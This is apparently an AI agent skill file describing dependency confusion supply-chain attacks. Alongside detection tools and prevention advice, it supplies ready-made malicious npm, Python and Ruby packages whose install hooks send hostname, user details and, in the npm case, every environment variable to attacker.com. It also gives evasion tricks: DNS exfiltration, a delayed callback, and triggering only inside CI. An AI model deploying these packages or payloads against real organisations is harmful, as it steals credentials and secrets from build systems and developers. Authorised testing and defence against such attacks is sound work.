---
name: dependency-confusion
description: Dependency confusion and supply chain attacks via package managers. Use for supply chain security testing.
---

# Dependency Confusion

## Description
Dependency Confusion (also known as Supply Chain Substitution Attack) occurs when a software installer script pulls a malicious package from a public repository instead of the intended private package with the same name. This attack exploits the package resolution order in package managers.

## How It Works

1. Target organization uses private/internal packages
2. Attacker identifies names of private packages
3. Attacker creates public package with same name but higher version
4. Package manager pulls public package (higher version wins)
5. Malicious code executes during installation

## Affected Package Managers

| Manager | Config File | Public Registry |
|---------|-------------|-----------------|
| npm | package.json | npmjs.com |
| pip | requirements.txt | pypi.org |
| gem | Gemfile | rubygems.org |
| Maven | pom.xml | Maven Central |
| NuGet | packages.config | nuget.org |
| Composer | composer.json | packagist.org |
| Go | go.mod | proxy.golang.org |

## Discovery Techniques

### 1. Finding Private Package Names

#### From JavaScript Files
```bash
# Search for require/import statements
grep -r "require(" ./js/ | grep -v "node_modules"
grep -r "import .* from" ./js/ | grep -v "node_modules"

# Common internal package patterns
grep -rE "require\(['\"]@company" ./
grep -rE "from ['\"]@internal" ./
```

#### From Configuration Files
```bash
# package.json dependencies
cat package.json | jq '.dependencies, .devDependencies'

# requirements.txt
cat requirements.txt | grep -v "^#"

# Gemfile
cat Gemfile | grep "gem "
```

#### From Error Messages
```
# Build errors may reveal internal package names
npm ERR! 404 'internal-auth-lib@1.0.0' is not in the npm registry
```

#### From Source Code Repositories
```bash
# Search GitHub for organization's package.json files
# Look for private registry URLs
grep -r "registry.internal" ./
```

### 2. Verifying Package Availability

#### NPM
```bash
# Check if package exists on public npm
npm view internal-package-name

# If 404, package name is available for takeover
# If exists, check if it's the same as target's package
```

#### PyPI
```bash
# Check if package exists
pip index versions internal-package-name

# Or use web API
curl https://pypi.org/pypi/internal-package-name/json
```

#### RubyGems
```bash
gem search -r internal-package-name
```

## Exploitation

### 1. NPM Package Creation

#### package.json
```json
{
  "name": "internal-auth-lib",
  "version": "99.0.0",
  "description": "Security research - dependency confusion",
  "main": "index.js",
  "scripts": {
    "preinstall": "node index.js"
  }
}
```

#### index.js (Callback Payload)
```javascript
const https = require('https');
const os = require('os');
const dns = require('dns');

// Collect information
const data = {
    hostname: os.hostname(),
    user: os.userInfo().username,
    cwd: process.cwd(),
    env: process.env
};

// DNS callback (works even with egress filtering)
const encoded = Buffer.from(JSON.stringify(data)).toString('base64')
    .replace(/=/g, '')
    .substring(0, 60);
dns.resolve(`${encoded}.callback.attacker.com`, () => {});

// HTTP callback
const postData = JSON.stringify(data);
const req = https.request({
    hostname: 'attacker.com',
    port: 443,
    path: '/callback',
    method: 'POST',
    headers: {
        'Content-Type': 'application/json',
        'Content-Length': postData.length
    }
}, (res) => {});
req.write(postData);
req.end();
```

### 2. Python Package Creation

#### setup.py
```python
from setuptools import setup
from setuptools.command.install import install
import os
import socket
import requests

class CustomInstall(install):
    def run(self):
        # Callback payload
        data = {
            'hostname': socket.gethostname(),
            'user': os.getenv('USER'),
            'cwd': os.getcwd(),
            'pip_version': os.popen('pip --version').read()
        }
        try:
            requests.post('https://attacker.com/callback', json=data)
        except:
            pass
        install.run(self)

setup(
    name='internal-auth-lib',
    version='99.0.0',
    description='Security research',
    cmdclass={'install': CustomInstall}
)
```

### 3. Ruby Gem Creation

#### gemspec
```ruby
Gem::Specification.new do |s|
  s.name        = 'internal-auth-lib'
  s.version     = '99.0.0'
  s.summary     = 'Security research'
  s.authors     = ['Researcher']
  s.files       = ['lib/internal-auth-lib.rb']
  s.extensions  = ['ext/extconf.rb']
end
```

#### ext/extconf.rb (Executes during install)
```ruby
require 'net/http'
require 'socket'
require 'json'

data = {
  hostname: Socket.gethostname,
  user: ENV['USER'],
  pwd: Dir.pwd
}

begin
  uri = URI('https://attacker.com/callback')
  Net::HTTP.post(uri, data.to_json, 'Content-Type' => 'application/json')
rescue
end

# Create dummy Makefile
File.write('Makefile', "install:\n\techo done")
```

## Advanced Techniques

### DNS Exfiltration
```javascript
// Bypass egress filtering using DNS
const dns = require('dns');
const data = Buffer.from(os.hostname()).toString('hex');
dns.resolve(`${data}.exfil.attacker.com`, () => {});
```

### Delayed Callback
```javascript
// Avoid immediate detection
setTimeout(() => {
    // Send callback
}, 3600000); // 1 hour delay
```

### Environment Detection
```javascript
// Only trigger in CI/CD environments
if (process.env.CI || process.env.JENKINS_URL || process.env.GITHUB_ACTIONS) {
    // Send callback
}
```

## Detection Tools

### Confused (Multi-platform)
```bash
# https://github.com/visma-prodsec/confused
# Checks for dependency confusion vulnerabilities

confused -l npm package.json
confused -l pip requirements.txt
confused -l composer composer.json
```

### DepFuzzer
```bash
# https://github.com/synacktiv/DepFuzzer
# Finds dependency confusion in Python
```

### NPM Audit
```bash
npm audit
# Look for warnings about package provenance
```

## Prevention

### 1. Scoped Packages (NPM)
```json
{
  "dependencies": {
    "@company/internal-lib": "1.0.0"
  }
}
```

### 2. Package Lock Files
```bash
# Always commit lock files
package-lock.json
Pipfile.lock
Gemfile.lock
```

### 3. Private Registry Configuration

#### NPM (.npmrc)
```
@company:registry=https://npm.internal.company.com/
//npm.internal.company.com/:_authToken=${NPM_TOKEN}
```

#### Pip (pip.conf)
```ini
[global]
index-url = https://pypi.internal.company.com/simple/
extra-index-url = https://pypi.org/simple/
```

### 4. Package Verification
```bash
# Verify package integrity
npm ci  # Uses package-lock.json strictly
pip install --require-hashes -r requirements.txt
```

### 5. Namespace Reservation
Register placeholder packages on public registries with the same names as internal packages.

## Real-World Impact

Alex Birsan's research demonstrated attacks on:
- Apple
- Microsoft
- PayPal
- Shopify
- Netflix
- Tesla
- Uber
- Yelp

## Checklist for Testing

- [ ] Identify internal package names from config files
- [ ] Check if names are available on public registries
- [ ] Verify package manager resolution order
- [ ] Test with higher version numbers
- [ ] Check for namespace protection
- [ ] Review .npmrc / pip.conf configurations

## References
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Dependency%20Confusion
- https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610
- https://github.com/visma-prodsec/confused
